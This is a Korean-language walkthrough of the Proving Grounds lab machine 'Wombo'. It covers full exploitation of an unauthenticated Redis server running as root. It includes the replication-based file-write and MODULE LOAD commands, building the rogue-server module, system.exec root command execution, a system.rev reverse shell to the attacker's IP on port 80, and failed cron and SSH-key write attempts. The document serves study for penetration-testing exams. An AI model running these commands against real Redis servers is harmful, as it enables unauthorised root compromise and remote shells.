---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/redis
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ports: [22, 80, 6379, 8080, 27017]
services: [http, http-proxy, mongodb, redis, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 2
---
> [!info] PG Practice — **Wombo** · Redis 무인증 → 즉시 root
> **타겟** 192.168.248.69 · **OS** Debian 9 Stretch (kernel 4.9.0-19-amd64, glibc 2.24, 호스트명 `wombo`) · **난이도** Fundamental · **플래그 1개(direct-to-root)**
> **경로 요약** 6379 **무인증 Redis 5.0.9가 root로 구동** → 복제(replication) 기반 임의 파일 쓰기로 악성 모듈 `exp.so` 심기 → `MODULE LOAD` → `system.exec`이 root 명령 실행 → `/root/proof.txt`
> **플래그** `proof.txt` = `d3441ce13f1b497ccb0575effb70ba65` · **`local.txt`은 존재하지 않는다**(단일 플래그 박스)

> [!warning] 이 노트를 읽는 규약 — 관측과 재구성을 구분하라
> 이 노트의 터미널 블록은 Kali 산출물 `~/PG/Wombo/`로 **실증된 것만** 코드펜스에 넣었다. 실증 출처: `nmap.log`·`nmap_lowrate.log`(정찰) · `redis_recon.txt`(Redis INFO/CONFIG) · `module_list.txt`·`id_output.txt`(익스플로잇 결과) · `verify_run.log`·`exploit_run.log`(스크립트 실행 로그) · `ssh_dir_check.txt`(타겟 에러 원문) · `manual_procedure.txt`(수동 절차) · `flags.txt`. 이 익스플로잇은 총괄이 **처음부터 재현해 재검증**했다.
> - **도구 동작·기본값에 대한 단정**은 별도 확인했다. Kali의 `redis-cli`/`redis-server`는 **8.0.4**라 타겟(5.0.9)과 에러 문구가 다르다 — 그래서 타겟 동작을 Kali 로컬 출력으로 대체하지 않았고, 타겟 고유 에러는 `ssh_dir_check.txt`처럼 **타겟에 직접 친 것만** 인용한다.
> - `[가정]` 표시가 붙은 문장은 이 박스에서 실행하지 않은 대안 경로다.

## 0. 이 박스에서 배우는 것

- **무인증 Redis = 임의 파일 쓰기 = RCE** — 이 등식이 어떻게 성립하는지, 복제(replication) 프로토콜 수준에서 정확히 설명한다. "6379가 열려 있다"를 보면 반사적으로 이 경로를 떠올려야 한다
- **Redis 4/5의 `MODULE LOAD`는 설계상 RCE다** — 모듈 API가 임의 `.so`를 `dlopen`하기 때문이고, `system.exec`/`system.rev`는 그 모듈이 등록하는 커맨드다
- **왜 root인가 — Redis가 root로 돌기 때문이지 모듈 때문이 아니다** — 인과를 정확히 하는 훈련
- **아웃바운드가 막히면 무엇을 의심하나** — 이 박스의 진짜 싸움은 익스플로잇이 아니라 **egress 필터링**이었다. 타겟은 tcp/80으로만 나갈 수 있었다
- **실패 원인을 계층으로 분리하라** — 최초의 :80 시도 실패는 네트워크가 아니라 **Kali 쪽 소켓 잔존**이었다. 이걸 오독하면 시간을 태운다([[Squid]]의 certutil 교훈과 같은 계열)
- **스크립트 크래시 ≠ 익스플로잇 실패** — `redis-rogue-server.py`는 모듈을 심은 **뒤에** 죽는다. 결과(`module list`)로 성공을 판정하라

> [!tip] 시험 출제 가능성 — **높다**
> 무인증 Redis는 OSCP·실무 양쪽에서 흔한 초기 침투 벡터다. 변형은 이런 모습이다 — Redis가 **저권한 계정**으로 돌아 foothold 후 별도 권한상승이 필요한 경우, `authorized_keys` 쓰기가 통하는 경우(이 박스는 `/root/.ssh` 부재로 불가), cron 경로가 통하는 경우. **핵심 원리(복제→파일쓰기→모듈로드)는 동일**하고, 막히는 지점만 박스마다 다르다. 이 노트의 6장이 그 "막히는 지점" 카탈로그다.

---

## 1. 정찰

### 1-1. Nmap — 전 포트 + 저속 교차 확인

Redis 박스에서 흔한 함정 하나는 필터링된 포트가 많아 스캔 결과가 흔들리는 것이다. 그래서 **min-rate 고속 스캔과 저속 스캔을 둘 다** 돌려 일치 여부를 봤다.

```bash
# 고속: 전 포트 + 스크립트/버전
nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.69
# 저속 교차: SYN 스캔, 위양성 배제
nmap -sS -p- -Pn --max-rate 500 -oN nmap_lowrate.log 192.168.248.69
```

고속 스캔의 핵심 줄(`nmap.log`):

```
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
53/tcp    closed domain
80/tcp    open   http       nginx 1.10.3
6379/tcp  open   redis      Redis key-value store 5.0.9
8080/tcp  open   http-proxy   (NodeBB, Node.js)
27017/tcp open   mongodb    MongoDB 4.0.18 4.1.1 - 5.0
```

저속 스캔(`nmap_lowrate.log`)이 **정확히 같은 6개 포트**를 냈다. `Not shown: 65529 filtered tcp ports`도 양쪽 일치 — **위양성 없음**. 이 이중 확인은 습관으로 굳혀야 한다: 고속 스캔은 필터링된 포트에서 응답을 놓쳐 열린 포트를 흘리거나 반대로 유령 포트를 만들 수 있다. 두 스캔이 합의하면 그 목록을 신뢰하고 다음으로 넘어간다.

> [!note] OS·커널 판정 근거 2개 교차
> - nmap 배너: `OpenSSH 7.4p1 Debian 10+deb9u7` → Debian 9 계열
> - 침투 후 `uname -a`(`id_output.txt`): `Linux wombo 4.9.0-19-amd64 #1 SMP Debian 4.9.320-2 (2022-06-30)` → **Debian 9 Stretch, kernel 4.9**
> - Redis INFO(`redis_recon.txt`): `os:Linux 4.9.0-19-amd64 x86_64`, `gcc_version:6.3.0` → 동일 확인
> 세 출처가 합의한다. glibc 2.24는 Debian 9의 표준 버전이다.

### 1-2. 서비스 식별 — 어디가 진입점인가

5개 서비스 중 **6379 Redis가 진입점**이다. 이유를 하나씩 배제하며 좁힌다:

| 포트 | 서비스 | 판정 |
|---|---|---|
| 22 | OpenSSH 7.4p1 | 자격증명 없이는 무의미. 침투 후 지속성 용도 |
| 80 | nginx 1.10.3 | **기본 "Welcome to nginx!" 페이지** — 콘텐츠 없음. 웹루트가 파일 쓰기 목표는 될 수 있음 |
| 6379 | **Redis 5.0.9** | **무인증 · protected-mode off · role master · root 구동** → 진입점 |
| 8080 | NodeBB (Node.js) | MongoDB 백엔드 포럼. 게시글 0개, 관리자 계정 미상 |
| 27017 | MongoDB 4.0.18 | **인증 요구** — 익명 접근 거부(`code = 13 Unauthorized`) |

80 nginx 기본 페이지와 8080 NodeBB(글이 하나도 없는 갓 설치 상태):

![[PG-Wombo-nginx-80.png]]
![[PG-Wombo-nodebb-8080.png]]

### 1-3. Redis 열거 — "이게 왜 뚫리는가"를 먼저 확인

무인증 Redis를 만나면 **가장 먼저** 칠 것은 `INFO`·`MODULE LIST`·`CONFIG GET dir`이다. 이 셋이 익스플로잇 가능 여부를 그 자리에서 판정한다(`redis_recon.txt`):

```
$ redis-cli -h 192.168.248.69 INFO server
redis_version:5.0.9
redis_mode:standalone
os:Linux 4.9.0-19-amd64 x86_64
executable:/usr/local/bin/redis-server        <-- 소스 컴파일 (패키지 아님)
config_file:/etc/redis/redis.conf

$ redis-cli -h 192.168.248.69 MODULE LIST
(empty array)                                  <-- 모듈 없음 = 로드 가능

$ redis-cli -h 192.168.248.69 CONFIG GET dir
dir
/                                              <-- CWD가 / (임의 경로 쓰기 자유)

$ redis-cli -h 192.168.248.69 CONFIG GET dbfilename
dbfilename
dump.rdb

$ redis-cli -h 192.168.248.69 INFO replication
role:master                                    <-- SLAVEOF로 슬레이브 전환 가능
connected_slaves:0
```

세 가지가 전부 초록불이다:
- **버전 5.0.9** — 모듈 로드 RCE가 통하는 4.x/5.x 대역
- **`MODULE LIST` 비어 있음** — `rename-command`로 MODULE이 막혀 있지 않다
- **`CONFIG GET dir` = `/`** — CONFIG SET이 막혀 있지 않고, 쓰기 경로를 자유롭게 지정할 수 있다

`executable:/usr/local/bin/redis-server`가 **소스 컴파일본**이라는 사실은 뒤(6장)에서 CVE-2022-0543을 배제하는 근거가 된다 — 미리 눈여겨 둔다.

---

## 2. 취약점 분석 — 무인증 Redis는 왜 임의 파일 쓰기이고, 왜 RCE인가

> [!abstract] 이 장이 노트의 핵심이다
> "Redis가 열려 있으면 뚫린다"는 결론만 외우면 변형 앞에서 무너진다. 여기서는 **복제 프로토콜이 어떻게 임의 파일 쓰기가 되고**, **모듈 API가 왜 임의 코드 실행이 되며**, **무엇이 이 박스를 root로 만드는지**를 각각 분리해 설명한다. 이 셋은 서로 독립된 이야기다.

### 2-1. 배경 ① — Redis의 신뢰 모델과 protected-mode

Redis는 애초에 **신뢰된 내부 네트워크에서만 돌린다는 전제**로 설계됐다. 그래서 기본적으로 인증이 없다. 방어선은 세 가지다:

| 방어 기제 | 무엇을 막는가 | 이 박스의 상태 |
|---|---|---|
| **bind 127.0.0.1** | 외부 인터페이스 노출을 막음 | **뚫림** — 0.0.0.0에 바인딩(외부에서 6379 접속됨) |
| **protected-mode** | bind가 전체 개방이고 AUTH도 없으면 외부 커맨드를 거부 | **뚫림** — `protected-mode off` (`redis_recon.txt`상 role master로 정상 응답) |
| **requirepass / AUTH** | 명령 실행 전 비밀번호 요구 | **뚫림** — AUTH 없이 모든 명령 수용 |
| **rename-command** | `CONFIG`·`MODULE`·`SLAVEOF` 같은 위험 명령을 숨김/개명 | **뚫림** — 원래 이름 그대로 동작 |

protected-mode는 3.2.0부터 도입된 안전장치로, **"외부 IP에서 접속했는데 bind도 전체 개방이고 AUTH도 없으면"** 명령을 거부한다. 이 박스는 그게 꺼져 있어(`off`) 외부에서 온 우리 명령이 그대로 실행된다. 네 방어선이 전부 내려가 있으므로 우리는 **인증되지 않은 임의 Redis 명령**을 실행할 수 있다.

### 2-2. 배경 ② — 복제(replication)가 어떻게 임의 파일 쓰기가 되는가

여기가 메커니즘의 심장이다. Redis 복제는 이렇게 동작한다:

1. 슬레이브가 `SLAVEOF <master> <port>`로 마스터에 붙는다.
2. 최초 동기화(full resync) 시 **마스터가 자신의 데이터셋 전체를 RDB 스냅샷 하나로 직렬화해 슬레이브에 그대로 전송**한다.
3. 슬레이브는 받은 RDB 바이트를 **자신의 `dir`/`dbfilename` 경로에 파일로 기록**한 뒤 로드한다.

정상 시나리오에서는 마스터가 진짜 Redis다. 하지만 **우리가 가짜 마스터(rogue master)를 세우면**, 3번 단계에서 슬레이브(=타겟)는 우리가 보낸 임의 바이트를 디스크에 쓴다. 그리고 그 **파일명과 경로를 우리가 CONFIG SET으로 지정**할 수 있다:

```
victim>  SLAVEOF <우리IP> <포트>          # 타겟을 우리 rogue master의 슬레이브로
victim>  CONFIG SET dbfilename exp.so      # 받은 RDB를 exp.so라는 이름으로 저장
victim>  CONFIG SET dir /some/writable/path # 어느 디렉터리에
```

full resync가 일어나면 rogue master는 **RDB 대신 우리의 `exp.so` 바이트**를 흘려보내고, 타겟은 그것을 `dir/dbfilename` = `<경로>/exp.so`로 **그대로 디스크에 쓴다.** 이것이 "무인증 Redis = 임의 파일 쓰기"의 정확한 메커니즘이다. RDB 앞뒤에 붙는 헤더/푸터 바이트 때문에 결과 파일은 순수 `.so`가 아니라 **RDB 껍데기로 감싼 `.so`**이지만, ELF 로더는 파일 선두의 ELF 매직만 보고 로드하므로 모듈로는 정상 동작한다.

### 2-3. 배경 ③ — `MODULE LOAD`는 왜 곧 RCE인가

Redis 4.0부터 **모듈 시스템**이 도입됐다. 모듈은 C로 작성한 공유 오브젝트(`.so`)로, `MODULE LOAD <path>`를 실행하면 Redis가 **그 파일을 `dlopen`하고 모듈의 `RedisModule_OnLoad` 진입점을 호출**한다. 즉 **임의의 네이티브 코드를 Redis 프로세스 안에서 실행**하는 것이 설계상 정상 기능이다.

이 박스가 심는 모듈 `exp.so`(n0b0dyCN/redis-rogue-server의 `RedisModulesSDK/exp/exp.c`)의 진입점은 두 커맨드를 등록한다:

```c
int RedisModule_OnLoad(RedisModuleCtx *ctx, ...) {
    RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1);
    RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "readonly", 1,1,1);
    RedisModule_CreateCommand(ctx, "system.rev",  RevShellCommand, "readonly", 1,1,1);
    return REDISMODULE_OK;
}
```

- **`system.exec <cmd>`** — `DoCommand`가 `popen(cmd, "r")`로 셸 명령을 실행하고 표준출력을 Redis 응답으로 돌려준다. `id`·`cat /root/proof.txt` 같은 걸 **Redis 커넥션 하나로** 실행할 수 있다.
- **`system.rev <ip> <port>`** — `RevShellCommand`가 소켓을 열고 `dup2`로 stdin/out/err을 넘긴 뒤 `execve("/bin/sh", 0, 0)` — **리버스셸**.

`DoCommand`의 실체는 이렇게 단순하다(`exp.c`):

```c
FILE *fp = popen(cmd, "r");          // 셸을 통해 임의 명령 실행
... fgets로 출력 수집 ...
RedisModule_ReplyWithString(ctx, ret); // Redis 응답으로 반환
```

`popen`은 `/bin/sh -c <cmd>`를 fork/exec한다. 이 프로세스의 권한은 **부모(redis-server)의 권한을 그대로 상속**한다.

### 2-4. 왜 root인가 — 인과를 정확히

foothold가 곧 root인 이유는 **모듈이 특별해서가 아니라 redis-server가 root로 돌기 때문이다.** `system.exec`가 만드는 `/bin/sh`는 redis-server의 자식이고, redis-server의 uid가 0이므로 자식도 uid 0이다. 확인(`id_output.txt`):

```
$ redis-cli -h 192.168.248.69 system.exec 'id'
uid=0(root) gid=0(root) groups=0(root)
$ redis-cli -h 192.168.248.69 system.exec 'whoami; hostname'
root
wombo
```

> [!warning] 흔한 오독 — "모듈 로드는 root RCE다"
> 아니다. 모듈 로드는 **redis-server가 가진 권한으로의** RCE다. Redis가 `redis` 유저로 돌았다면 같은 익스플로잇이 `uid=NNN(redis)`를 냈을 것이고, 그때는 별도 권한상승이 필요하다(4장 참조). **"root RCE"의 root는 Redis의 구동 계정에서 온다** — 익스플로잇에서 오는 게 아니다. 이 구분을 흐리면 다음 Redis 박스에서 "왜 root가 아니지?"에서 막힌다.

### 2-5. 왜 이 페이로드 순서인가 — 각 명령의 역할

`manual_procedure.txt`의 수동 절차를 조각내어 각 줄이 무엇을 하는지 본다:

```
redis-cli -h TARGET slaveof <우리IP> 80        # ① 타겟을 우리 rogue master의 슬레이브로
redis-cli -h TARGET config set dbfilename exp.so  # ② 받을 RDB의 저장 파일명 지정
   (rogue master가 exp.so 바이트를 RDB로 전송 → 타겟 CWD에 exp.so 기록됨)
redis-cli -h TARGET module load ./exp.so       # ③ 방금 쓴 파일을 dlopen → system.* 등록
redis-cli -h TARGET slaveof no one             # ④ 복제 관계 해제(원상복구 시작)
redis-cli -h TARGET config set dbfilename dump.rdb  # ⑤ dbfilename 원복
redis-cli -h TARGET system.exec 'cat /root/proof.txt'  # ⑥ root로 명령 실행
```

- **① slaveof** — 복제 트리거. 이게 있어야 full resync가 일어나 마스터의 바이트가 타겟 디스크에 쓰인다.
- **② config set dbfilename** — 쓰기 대상 파일명. `dir`는 이미 `/`이지만 실무에선 `config set dir <경로>`로 쓰기 가능한 디렉터리를 지정한다. 여기선 CWD(`./`)로 충분했다.
- **③ module load ./exp.so** — `./`는 Redis의 현재 작업 디렉터리 기준 상대경로. `dir`가 가리키는 곳에 파일이 쓰였으므로 `./exp.so`로 접근된다.
- **④⑤** — 흔적 최소화 겸 Redis를 정상 상태로 되돌린다. 이걸 빼면 타겟이 계속 우리 슬레이브로 남아 이상 동작한다.

---

## 3. Foothold — Redis 모듈 로드 RCE

권한상승 단계가 없으므로 foothold가 곧 최종 침투다. 두 가지 전달 방식이 있다: **스크립트(3-1)** 와 **순수 수동(3-2)**. 시험 대비상 둘 다 손에 익혀야 한다.

### 3-1. redis-rogue-server.py로 전달 (실제로 쓴 경로)

먼저 모듈을 빌드한다. 저장소의 prebuilt `.so`는 낡은 툴체인으로 만들어져 현대 Kali의 gcc에서 재빌드해야 했다(`manual_procedure.txt`):

```bash
git clone https://github.com/n0b0dyCN/redis-rogue-server
cd redis-rogue-server/RedisModulesSDK/exp
# 현대 gcc 대응: 누락 헤더 추가 + -Werror 완화
sed -i 's|#include <netinet/in.h>|#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <string.h>|' exp.c
sed -i 's/-Wall/-w/' Makefile
make        # -> exp.so
```

빌드된 `exp.so`가 요구하는 glibc 심볼은 최소 버전 하나뿐이다 — 이게 6장의 glibc 오진을 무너뜨린 사실이다:

```bash
$ objdump -T exp.so | grep -o 'GLIBC_[0-9.]*' | sort -u
GLIBC_2.2.5
```

`GLIBC_2.2.5`만 요구하므로 Debian 9(glibc 2.24)에서 **그대로 로드된다.** 실행:

```bash
cd redis-rogue-server ; cp RedisModulesSDK/exp/exp.so exp.so
sudo python3 redis-rogue-server.py --rhost 192.168.248.69 --rport 6379 \
     --lhost 192.168.45.207 --lport 80
```

> [!danger] `--lport 80`이 이 박스의 사활을 갈랐다
> 기본 포트(21000)나 443·8080으로는 **타겟이 우리 rogue master에 connect-back을 하지 못한다.** 타겟 egress가 tcp/80만 허용하기 때문이다(6장 상세). rogue master를 **:80에 세워야** full resync가 성사된다.

스크립트 실행 로그(`verify_run.log`) — **모듈이 로드된 뒤 스크립트가 죽는다**:

```
[info] TARGET 192.168.248.69:6379
[info] SERVER 192.168.45.207:80
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...            <-- 여기서 MODULE LOAD 성사됨
[info] Temerory cleaning up...
[err ] UnicodeDecodeError('gb18030', b'$300\r\n...', 16, 17, 'illegal multibyte sequence')
```

`din()`이 소켓 응답을 `.decode('gb18030')`로 풀려다 RDB 바이너리에서 죽는 것이다. **크래시는 무시하고 결과로 판정**한다(`module_list.txt`):

```
$ redis-cli -h 192.168.248.69 module list
name
system
ver
1
```

`system` 모듈이 등재됐다 — **성공**. 이제 커넥션 하나로 root 명령을 친다:

```bash
$ redis-cli -h 192.168.248.69 system.exec 'id'
uid=0(root) gid=0(root) groups=0(root)
$ redis-cli -h 192.168.248.69 system.exec 'cat /root/proof.txt'
d3441ce13f1b497ccb0575effb70ba65
```

### 3-2. 순수 수동 대안 (스크립트 없이 — OSCP 필수)

> [!tip] 시험에서 스크립트가 막히거나 못 쓸 때
> `manual_procedure.txt`에 스크립트 없는 절차 전문이 있다. rogue master를 직접 세우는 부분만 도구가 필요하고, 나머지는 순수 `redis-cli`다.

핵심은 **rogue master가 :80에서 대기**해야 한다는 것이다(egress 제약). rogue master 역할은 위 `redis-rogue-server.py`가 대신하지만, 개념적으로는 "슬레이브의 PSYNC에 대해 `+FULLRESYNC` 후 `$<len>\r\n<exp.so 바이트>`를 흘려보내는" 최소 TCP 서버다. 그 위에서:

```bash
redis-cli -h 192.168.248.69 slaveof 192.168.45.207 80
redis-cli -h 192.168.248.69 config set dbfilename exp.so
# 타겟이 rogue master의 가짜 RDB(=exp.so)를 CWD에 씀
redis-cli -h 192.168.248.69 module load ./exp.so
redis-cli -h 192.168.248.69 slaveof no one
redis-cli -h 192.168.248.69 config set dbfilename dump.rdb
redis-cli -h 192.168.248.69 module list                 # -> system ver 1
redis-cli -h 192.168.248.69 system.exec 'cat /root/proof.txt'
```

> [!warning] `system.exec`는 대화형 셸이 아니다 — 시험이라면 리버스셸을 잡아라
> `system.exec`로 읽은 플래그는 **웹셸로 읽은 플래그와 같은 지위**다 — 비대화형 명령 실행이다. **OSCP는 웹셸로 얻은 플래그를 0점 처리**한다([[Butch]] 참조). 시험이라면 `system.rev`로 리버스셸을 먼저 잡고 그 안에서 `whoami; hostname; ip a; cat proof.txt`를 **한 화면에** 담아야 한다:
> ```bash
> redis-cli -h 192.168.248.69 system.rev 192.168.45.207 80
> ```
> ⚠️ 이 리버스셸도 **:80으로만** 붙는다. `nc -lvnp 80`으로 받아야 하고, 다른 포트는 egress에 막힌다. 이 박스에서 :80은 익스플로잇 전달 채널이자 리버스셸 채널로 이중 역할을 한다.

---

## 4. 권한상승 — **이 박스에는 없다**

> [!note] 왜 권한상승 단계가 없는가
> redis-server가 **root로 구동**되므로 `system.exec`가 만드는 셸이 처음부터 uid=0이다(2-4 참조). foothold == root. `sudo -l`·`find / -perm -4000`·`getcap`을 칠 필요가 없다 — 이미 최상위 권한이다.

그래도 **"만약 Redis가 저권한이었다면"**을 생각해 두는 것이 학습이다. 아래는 이 박스에서 실행하지 않은 대안이므로 `[가정]`이다:

- `[가정]` Redis가 `redis` 유저로 돌았다면 foothold는 uid=redis. 그다음 표준 리눅스 권한상승 열거로 넘어간다: `sudo -l`, SUID 바이너리(`find / -perm -4000 2>/dev/null`), capabilities(`getcap -r / 2>/dev/null`), 쓰기 가능한 cron(`cat /etc/crontab; ls -la /etc/cron.d`), 커널 익스플로잇(Debian 9 / kernel 4.9는 오래됐으므로 후보가 있다).
- `[가정]` `redis` 유저라도 `config set dir`로 쓸 수 있는 root 소유 경로(예: 웹루트를 특정 서비스가 root cron으로 처리)가 있으면 그쪽으로 우회 가능. 이 박스에서 cron/authorized_keys 경로가 왜 막혔는지는 6장에서 다룬다.

> [!tip] 셸을 잡자마자 칠 명령 5개 (권한상승 없는 박스라도 습관으로)
> `id` · `sudo -l` · `find / -perm -4000 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab; ls -la /etc/cron.d`
> 이 박스는 첫 명령 `id`에서 이미 `uid=0`이 떠 나머지가 불필요했지만, 저권한으로 떨어지는 변형에서는 이 반사가 시간을 아낀다.

---

## 5. 플래그

| 플래그 | 위치 | 값 |
|---|---|---|
| `proof.txt` | `/root/proof.txt` | `d3441ce13f1b497ccb0575effb70ba65` |
| `local.txt` | **존재하지 않음** | — |

`local.txt` 부재는 추정이 아니라 **확인된 사실**이다(`flags.txt`, 총괄 재검증):

```bash
$ find / -name local.txt 2>/dev/null      # 무결과
$ ls -la /home                            # . 와 .. 뿐 (빈 디렉터리)
$ ls -la /root                            # proof.txt 하나
```

NodeBB를 돌리는 `nodebb` 계정(uid 1000)의 홈 `/home/nodebb`조차 생성돼 있지 않다. **Wombo는 단일 플래그 direct-to-root 박스**다. 저권한 사용자 플래그를 찾아 헤매지 말 것 — 이 박스 설계에는 그런 단계가 없다.

---

## 6. 막혔던 지점 / 시행착오 — 이 박스의 진짜 학습

> [!abstract] 익스플로잇은 5분, 나머지는 egress와의 싸움이었다
> 모듈 로드 RCE 자체는 알려진 기법이라 빨랐다. 시간을 태운 건 **connect-back이 안 잡히는 원인을 계층별로 분리하지 못한 것**이었다. 아래 다섯 개는 전부 "왜 안 됐는지"의 근거와 함께 기록한다 — 다음 Redis/egress 박스에서 이 목록이 시간을 아낀다.

### ① 아웃바운드가 tcp/80으로만 열려 있었다 — 이 박스의 전부

리버스셸과 rogue 복제를 443·8080·21000으로 시도했더니 **tcpdump에 connect-back SYN이 하나도 안 잡혔다.** 처음엔 "아웃바운드가 통째로 막혔다"로 오판했다. 실제로는 **타겟 방화벽이 tcp/80 아웃바운드만 허용**한다. rogue server를 `--lport 80`으로 올리자 즉시 붙었다(`verify_run.log`의 `SERVER 192.168.45.207:80` → `Loading module...` 성사).

진단의 정석: rogue master/리스너를 **여러 포트로 번갈아 세우고 tcpdump로 어느 포트에 SYN이 오는지** 본다. connect-back이 **한 포트에만** 오면 그게 허용된 egress다. "아무 데도 안 온다"가 아니라 "어디로 오는지"를 물어야 한다.

> [!tip] 아웃바운드가 막히면 의심 순서
> 1. **egress 포트 필터링** — 443·80만 허용하는 경우가 흔하다(HTTP/HTTPS로 위장한 C2를 막으려다 정상 트래픽만 남긴 형국). [[Hawat]]는 **443만** 허용이었고, 이 박스는 **80만** 허용이었다.
> 2. **인라인 블로킹/IPS** — 페이로드 시그니처로 끊는 경우.
> 3. **바인드 실패(로컬 문제)** — ②가 정확히 이것이었다.
> 이 세 계층을 분리하지 못하면 시간을 태운다.

### ② 가장 값진 교훈 — 첫 :80 실패는 네트워크가 아니라 로컬 소켓이었다

최초의 :80 시도가 실패했다(`exploit_run.log`):

```
[info] SERVER 192.168.45.207:80
[info] Setting master...
[info] Setting dbfilename...
[err ] OSError(98, 'Address already in use')
```

이걸 **네트워크 실패로 읽고 다른 포트들을 헤맸다.** 하지만 `errno 98 Address already in use`는 **Kali 쪽에서 소켓 bind가 실패**한 것이다 — 직전 시도의 잔존 소켓이 TIME_WAIT로 :80을 물고 있었다. 네트워크는 멀쩡했다. **같은 포트를 비우고(잔존 프로세스 종료 후) 한 번 더 시도했어야** 했다.

> [!danger] 실패 원인을 계층으로 분리하라 — [[Squid]]와 같은 계열의 교훈
> [[Squid]]에서는 `certutil`이 성공 배너를 내면서도 파일을 못 썼다("성공 메시지를 믿지 말고 실제로 확인하라"). 여기서는 **에러 메시지의 계층을 오독**했다 — `Address already in use`는 원격 방화벽이 아니라 **로컬 bind** 계층의 문제다. 에러가 나면 **어느 계층(로컬 소켓 / 라우팅 / 원격 방화벽 / 애플리케이션)에서 났는지**를 먼저 판정하라. `errno 98`은 언제나 로컬이다.

### ③ 막다른 길 A — `/etc/cron.d` 경로는 RDB 오염으로 사망

Redis→cron은 무인증 Redis의 고전적 권한상승/RCE 경로다: `config set dir /etc/cron.d` → `config set dbfilename pwnjob` → cron 문법 문자열을 SET → `save`. cron이 그 파일을 읽어 명령을 돌린다. 시도했다(`plant_cron.sh`·`plant_cron2.sh`).

**cron은 돌고 있었다**(pid 429). 그런데 실패했다. 원인 진단이 이 항목의 값어치다 — RDB를 웹루트에 써서 HTTP로 받아 **실제 바이트를 눈으로 확인**했다:

- RDB 덤프는 파일 선두에 **`REDIS0009...` 바이너리 헤더 줄**을 붙인다. Debian cron은 `/etc/cron.d` 파일을 파싱할 때 **파싱 불가능한 줄이 있으면 파일 전체를 버린다.** 선두 바이너리 줄에서 걸려 우리 cron 명령까지 통째로 폐기됐다.
- 부수 버그도 하나 잡았다: 셸의 `$(...)` 명령치환이 **후행 개행을 먹어**, RDB의 `\xff`+CRC 푸터가 cron 명령 줄에 그대로 붙어버렸다(`plant_cron.sh`의 `PRE`/`POST`에 `\n\n` 패딩을 준 이유). 이건 고쳤지만 — **선두 바이너리 줄이 여전히 파일을 죽인다.**

결론: **Debian에서 Redis→cron.d는 RDB 헤더 오염 때문에 불안정하다.** RDB 바디에 cron 문법을 넣어도 헤더/푸터 바이너리가 파일을 오염시킨다. (일부 배포판의 cron은 이 상황에서 유효한 줄만 취하기도 하나, **이 박스의 Debian 9 cron은 파일 전체를 버렸다** — 실측.)

### ④ 막다른 길 B — `authorized_keys` 트릭 불가 (`/root/.ssh` 부재)

두 번째 고전 경로: `config set dir /root/.ssh` → `dbfilename authorized_keys` → 우리 공개키를 SET → save → SSH 로그인. 하지만 타겟은 이 디렉터리가 없어 CONFIG SET에서 막혔다(`ssh_dir_check.txt`, **타겟에 직접 친 실측**):

```
$ redis-cli -h 192.168.248.69 config set dir /root/.ssh
ERR Changing directory: No such file or directory
$ redis-cli -h 192.168.248.69 config get dir
dir
/
```

`config set dir`는 내부적으로 `chdir()`를 호출하는데, `/root/.ssh`가 존재하지 않아 `chdir`이 실패하고 위 에러를 낸다. `dir`는 바뀌지 않고 `/`로 남는다. 디렉터리 자체를 만들 수단이 없으니(그러려면 이미 RCE가 필요) 이 경로는 닫혔다.

> [!note] Redis→SSH 키 경로의 전제 조건
> 이 트릭은 **대상 `.ssh` 디렉터리가 이미 존재**하고 **Redis가 그곳에 쓸 권한**이 있어야 성립한다. `/home/<user>/.ssh`가 있는 사용자를 노리는 게 보통이지만, 이 박스는 root 외 사용자 홈이 없고 `/root/.ssh`도 미생성이라 원천 봉쇄됐다.

### ⑤ 막다른 길 C — CVE-2022-0543 (Lua 샌드박스 탈출) 미적용

또 하나의 후보는 CVE-2022-0543 — Debian/Ubuntu **패키지판** Redis가 Lua 인터프리터를 불완전하게 샌드박싱해 `EVAL`에서 `package.loadlib`로 시스템 함수에 도달하는 결함이다. 시도할 이유가 있었지만 이 박스엔 적용되지 않는다:

- 이 Redis는 **소스 컴파일본** `/usr/local/bin/redis-server`다(1-3의 `executable:` 확인). CVE-2022-0543은 **데비안 패키징이 추가한 Lua 라이브러리 노출**이 원인이라, 소스 컴파일본에는 그 취약 경로가 없다.
- 소스 컴파일 Redis의 Lua는 `package`·`os`가 **nil로 제대로 샌드박싱**돼 있어 `EVAL`에서 시스템 접근이 차단된다.

> [!warning] Kali 로컬로 타겟 동작을 흉내 내지 마라 — 버전이 다르다
> Kali의 `redis-server`는 **8.0.4**라 `MODULE LOAD`·`CONFIG SET dir`·`EVAL package` 모두 타겟(5.0.9)과 **에러 문구가 다르다**(8.x는 `enable-module-command`·`protected config` 같은 신규 가드를 낸다). 그래서 이 노트는 타겟 고유 동작을 **타겟에 직접 친 출력**(`ssh_dir_check.txt` 등)으로만 인용한다. CVE-2022-0543의 "package/os가 nil"은 소스 컴파일 Redis의 일반 성질로 서술했고, 타겟의 Lua 출력을 코드펜스로 위조하지 않았다.

### ⑥ 총괄의 오진 — glibc 2.24 불일치 의심은 틀렸다

처음에 "`exp.so`가 최신 Kali(glibc 2.35+)에서 빌드됐으니 Debian 9(glibc 2.24)에서 심볼 불일치로 로드 실패할 것"이라 의심했다. **틀렸다.** `objdump -T exp.so`가 요구 심볼로 **`GLIBC_2.2.5` 하나만** 보였다(3-1). 이 모듈이 쓰는 함수(`popen`·`socket`·`dup2`·`execve`·`strcat`)는 전부 glibc 초기부터 있던 심볼이라 최신 버전 심볼을 끌어오지 않는다. Debian 9는 2.24 ≥ 2.2.5이므로 **그대로 로드된다.**

> [!tip] 오진도 기록 가치가 있다
> 빌드 시 실제로 필요했던 건 glibc 대응이 **아니라** 현대 gcc 대응이었다 — `arpa/inet.h`·`string.h` 인클루드 누락(구 코드가 암시적 선언에 의존)과 `-Wall`→`-w`로 `-Werror` 완화(3-1). **"glibc 불일치"라는 그럴듯한 가설을 `objdump` 한 줄이 반증**했다. 크로스 빌드 호환성은 **추측하지 말고 심볼 버전을 확인**하라 — 정적 링크가 아닌 이상 요구 심볼의 최소 버전만 맞으면 된다.

---

